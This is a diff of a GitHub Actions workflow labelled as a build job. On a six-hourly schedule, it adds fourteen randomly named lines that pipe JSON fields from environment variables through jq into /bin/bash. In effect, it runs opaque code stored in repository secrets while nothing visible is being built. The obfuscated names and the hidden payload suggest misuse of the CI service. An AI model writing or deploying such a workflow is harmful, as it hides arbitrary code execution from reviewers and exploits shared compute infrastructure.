@@ -1,25 +1,30 @@
 name: fengshuting6712
-
 on:
   workflow_dispatch:
   schedule:
-    - cron: '53 0/6 * * *'
+    - cron: '49 2/6 * * *'
 
 jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: fengshuting6712
         env:
-          ahpp403: ${{ secrets.ahpp403 }}
+          jwjz23: ${{ secrets.jwjz23 }}
         run: |
-          echo $ahpp403 | jq -r .kd3 | /bin/bash
-          echo $b6080 | jq -r .asf0 | /bin/bash
-          echo $rl2 | jq -r .xthbk9934 | /bin/bash
-          echo $tn0 | jq -r .zgpds6562 | /bin/bash
-          echo $srskw77 | jq -r .xd1503 | /bin/bash
-          echo $f0 | jq -r .tekpj56 | /bin/bash
-          echo $fljqs1339 | jq -r .xsu0302 | /bin/bash
+          echo $jwjz23 | jq -r .aubgq791 | /bin/bash
+          echo $ykmif036 | jq -r .eky04 | /bin/bash
+          echo $gtcnc515 | jq -r .ytlep40113 | /bin/bash
+          echo $islo104 | jq -r .n69 | /bin/bash
+          echo $n665 | jq -r .bvln50069 | /bin/bash
+          echo $dt1 | jq -r .w703 | /bin/bash
+          echo $tii16 | jq -r .eipcd3544 | /bin/bash
+          echo $oubv68907 | jq -r .njdcn0 | /bin/bash
+          echo $qfihe4 | jq -r .h20 | /bin/bash
+          echo $hjoxq26113 | jq -r .es4386 | /bin/bash
+          echo $aolhl21 | jq -r .bpkd30 | /bin/bash
+          echo $ahjg85 | jq -r .ee7099 | /bin/bash
+          echo $utd36 | jq -r .ozgz8456 | /bin/bash
+          echo $pmqgj53329 | jq -r .hwk074 | /bin/bash
 
